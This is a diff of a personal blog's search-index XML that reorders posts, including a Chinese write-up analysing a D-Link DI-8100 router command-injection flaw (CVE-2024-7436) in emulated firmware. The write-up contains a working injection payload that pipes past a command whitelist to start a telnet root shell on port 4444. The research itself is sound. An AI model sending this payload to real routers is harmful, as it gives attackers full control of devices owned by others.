@@ -1,6 +1,61 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CVE-2024-7436 D-Link DI-8100 命令执行漏洞分析</title>
+    <url>/2026/10/08/cve-2024-7436-dlink-di-8100/</url>
+    <content><![CDATA[<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>下载固件后使用binwalk解包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me DI_8100-16.07.26A1.zip</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p><img src="/img/cve-2024-7436/01.png"></p>
+<p>进入解包后的目录</p>
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh /home/blonet/下载/_DI_8100-16.07.26A1.zip.extracted/_DI_8100-16.07.26A1.trx.extracted/_8C.extracted/_3F8000.extracted/cpio-root</span><br></pre></td></tr></table></figure>
+
+<p>查找到jhttpd文件</p>
+<p><img src="/img/cve-2024-7436/02.png"></p>
+<p>分析与jhttpd有关的rc</p>
+<p>根据漏洞信息报告找到危险函数 system</p>
+<p><img src="/img/cve-2024-7436/03.png"></p>
+<p>执行v10，v10由v28而来</p>
+<p><img src="/img/cve-2024-7436/04.png"></p>
+<p>v28由v16拼接字符串</p>
+<p><img src="/img/cve-2024-7436/05.png"></p>
+<p>那么就有一个命令执行漏洞</p>
+<p>再看前面的if条件</p>
+<p><img src="/img/cve-2024-7436/06.png"></p>
+<p>flag 是路由器，决定执行哪条命令</p>
+<p>是cmd时才会执行漏洞函数</p>
+<p>先看命令模板wys %s &gt; &#x2F;tmp&#x2F;msp.info  wys 里有一个命令表 gl_order_str</p>
+<p>直接传 cmd&#x3D;ls，wys 查表，表里没有ls，拒绝执行，no order,please help。</p>
+<p>要用管道符 | 绕过</p>
+<p>因为直接使用不了命令，也是通过丰富的经验知道通过busybox去调用</p>
+<h1 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h1><p>使用firmae模拟</p>
+<p><img src="/img/cve-2024-7436/07.png"></p>
+<p><img src="/img/cve-2024-7436/08.png"></p>
+<p>进入到路由器管理页面（账号密码依旧丰富的经验，但也可以找到）</p>
+<p><img src="/img/cve-2024-7436/09.png"></p>
+<p>然后用bp拦截改数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag=cmd&amp;cmd=|/bin/busybox%20telnetd%20-l%20/bin/sh%20-p%204444</span><br></pre></td></tr></table></figure>
+
+<p>发送</p>
+<p><img src="/img/cve-2024-7436/10.png"></p>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>查看固件的busybox</p>
+<p><img src="/img/cve-2024-7436/11.png"></p>
+<p>有telnetd可以反弹shell</p>
+<p><img src="/img/cve-2024-7436/12.png"></p>
+]]></content>
+      <categories>
+        <category>技术笔记</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>IoT</tag>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2025-14659 D-Link DIR-860LB1 v203b03 命令注入漏洞</title>
     <url>/2026/10/24/cve-2025-14659-dlink-dir-860l-b1/</url>
     <content><![CDATA[<h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me DIR-860L_B1_FW203b03.bin</span><br></pre></td></tr></table></figure>
@@ -86,80 +141,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2026/10/08/hello-world/</url>
-    <content><![CDATA[<p>Hello World.</p>
-<p>学一门新语言、开一个新项目，第一件事总是先让它向世界问个好。新博客也一样，就从这个标题开始。</p>
-<span id="more"></span>
-
-<p>这里是我的个人博客，准备用来放技术笔记和平时的一些零散想法。</p>
-<p>之所以想有个自己的地方：写下来的东西，才算真正想清楚过。放在自己的站点上，排版是自己的，数据也是自己的。</p>
-<p>暂时没什么宏大的计划，就是慢慢写、一直写。</p>
-<p>那么，从这一篇开始。</p>
-]]></content>
-      <categories>
-        <category>生活</category>
-      </categories>
-      <tags>
-        <tag>随笔</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2024-7436 D-Link DI-8100 命令执行漏洞分析</title>
-    <url>/2026/10/08/cve-2024-7436-dlink-di-8100/</url>
-    <content><![CDATA[<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>下载固件后使用binwalk解包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me DI_8100-16.07.26A1.zip</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p><img src="/img/cve-2024-7436/01.png"></p>
-<p>进入解包后的目录</p>
-<p>使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh /home/blonet/下载/_DI_8100-16.07.26A1.zip.extracted/_DI_8100-16.07.26A1.trx.extracted/_8C.extracted/_3F8000.extracted/cpio-root</span><br></pre></td></tr></table></figure>
-
-<p>查找到jhttpd文件</p>
-<p><img src="/img/cve-2024-7436/02.png"></p>
-<p>分析与jhttpd有关的rc</p>
-<p>根据漏洞信息报告找到危险函数 system</p>
-<p><img src="/img/cve-2024-7436/03.png"></p>
-<p>执行v10，v10由v28而来</p>
-<p><img src="/img/cve-2024-7436/04.png"></p>
-<p>v28由v16拼接字符串</p>
-<p><img src="/img/cve-2024-7436/05.png"></p>
-<p>那么就有一个命令执行漏洞</p>
-<p>再看前面的if条件</p>
-<p><img src="/img/cve-2024-7436/06.png"></p>
-<p>flag 是路由器，决定执行哪条命令</p>
-<p>是cmd时才会执行漏洞函数</p>
-<p>先看命令模板wys %s &gt; &#x2F;tmp&#x2F;msp.info  wys 里有一个命令表 gl_order_str</p>
-<p>直接传 cmd&#x3D;ls，wys 查表，表里没有ls，拒绝执行，no order,please help。</p>
-<p>要用管道符 | 绕过</p>
-<p>因为直接使用不了命令，也是通过丰富的经验知道通过busybox去调用</p>
-<h1 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h1><p>使用firmae模拟</p>
-<p><img src="/img/cve-2024-7436/07.png"></p>
-<p><img src="/img/cve-2024-7436/08.png"></p>
-<p>进入到路由器管理页面（账号密码依旧丰富的经验，但也可以找到）</p>
-<p><img src="/img/cve-2024-7436/09.png"></p>
-<p>然后用bp拦截改数据：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag=cmd&amp;cmd=|/bin/busybox%20telnetd%20-l%20/bin/sh%20-p%204444</span><br></pre></td></tr></table></figure>
-
-<p>发送</p>
-<p><img src="/img/cve-2024-7436/10.png"></p>
-<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>查看固件的busybox</p>
-<p><img src="/img/cve-2024-7436/11.png"></p>
-<p>有telnetd可以反弹shell</p>
-<p><img src="/img/cve-2024-7436/12.png"></p>
-]]></content>
-      <categories>
-        <category>技术笔记</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-        <tag>IoT</tag>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>来一个简单ret2text</title>
     <url>/2026/10/24/simple-ret2text/</url>
     <content><![CDATA[<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>将题目附件拖入IDA打开</p>
@@ -192,6 +173,25 @@
         <tag>Pwn</tag>
         <tag>栈溢出</tag>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2026/10/08/hello-world/</url>
+    <content><![CDATA[<p>Hello World.</p>
+<p>学一门新语言、开一个新项目，第一件事总是先让它向世界问个好。新博客也一样，就从这个标题开始。</p>
+<span id="more"></span>
+
+<p>这里是我的个人博客，准备用来放技术笔记和平时的一些零散想法。</p>
+<p>之所以想有个自己的地方：写下来的东西，才算真正想清楚过。放在自己的站点上，排版是自己的，数据也是自己的。</p>
+<p>暂时没什么宏大的计划，就是慢慢写、一直写。</p>
+<p>那么，从这一篇开始。</p>
+]]></content>
+      <categories>
+        <category>生活</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
       </tags>
   </entry>
 </search>
